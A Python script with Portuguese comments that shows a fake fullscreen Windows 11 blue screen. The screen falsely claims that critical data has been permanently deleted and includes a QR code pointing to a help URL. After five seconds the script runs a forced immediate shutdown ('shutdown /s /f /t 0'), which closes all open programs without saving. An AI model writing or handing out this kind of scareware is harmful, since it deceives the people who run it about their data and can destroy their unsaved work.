import ctypes
import tkinter as tk
import qrcode
import os
from PIL import Image, ImageTk

# Função para exibir uma mensagem de erro no estilo do Windows
def mostrar_erro(titulo, mensagem):
    ctypes.windll.user32.MessageBoxW(0, mensagem, titulo, 0x10)

# Função para criar uma tela azul simulando a BSOD do Windows 11
def tela_azul():
    # Cria uma janela em tela cheia
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="#1e1e1e")  # Cor de fundo semelhante ao Windows 11

    # Texto para o canto superior esquerdo
    emoji_texto = """\
:( 
"""
    
    # Exibe o emoji no canto superior esquerdo
    emoji_label = tk.Label(root, text=emoji_texto, font=("Segoe UI", 100), fg="white", bg="#1e1e1e", justify="left")
    emoji_label.place(relx=0.0, rely=0.0, anchor='nw', x=100, y=190)  # Ajusta a posição para o canto superior esquerdo

    # Texto da tela azul da morte personalizado
    texto = """\
Seu PC encontrasse com várias falhas no sistema, foi detectado a exclusão permanente de dados críticos.
"""
    
    # Exibe o texto na tela azul
    label = tk.Label(root, text=texto, font=("Segoe UI", 20), fg="white", bg="#1e1e1e", justify="center")
    label.pack(expand=True, padx=50, pady=(50, 10))  # Adiciona padding para evitar sobreposição

    # Texto ao lado do QR Code com tamanho reduzido
    texto2 = """\
As informações afetadas não podem ser recuperadas. Realizando uma verificação completa do sistema...
Se precisar de assistência, consulte: DATA_CORRUPTION_ERROR
"""
    label2 = tk.Label(root, text=texto2, font=("Segoe UI", 12), fg="white", bg="#1e1e1e", justify="left")  # Fonte menor
    label2.place(x=325, y=500)  # Ajusta a posição para ficar ao lado do QR Code
    
    # Gera o QR Code
    qr_data = "https://www.example.com/help"  # URL ou texto para o QR Code
    qr_size = 150  # Tamanho desejado do QR Code (em pixels)
    qr = qrcode.QRCode(version=1, box_size=qr_size // 25, border=5)  # Ajusta box_size com base no tamanho total
    qr.add_data(qr_data)
    qr.make(fit=True)

    # Cria uma imagem do QR Code
    qr_img = qr.make_image(fill_color="black", back_color="white")

    # Redimensiona a imagem do QR Code para o tamanho desejado
    qr_img = qr_img.resize((qr_size, qr_size), Image.LANCZOS)  # Use Image.LANCZOS em vez de Image.ANTIALIAS
    qr_img.save("qr_code.png")

    # Carrega a imagem do QR Code
    qr_image = Image.open("qr_code.png")
    qr_photo = ImageTk.PhotoImage(qr_image)

    # Exibe o QR Code na tela, posicionado no canto inferior esquerdo
    qr_label = tk.Label(root, image=qr_photo, bg="#1e1e1e")
    qr_label.image = qr_photo  # Mantém uma referência da imagem
    qr_label.place(x=200, y=500)  # Posição no canto inferior esquerdo

    # Executa o comando de desligamento após um pequeno atraso
    root.after(5000, lambda: (os.system("shutdown /s /f /t 0"), root.destroy()))
    root.mainloop()

# Executa a função da tela azul simulada
tela_azul()
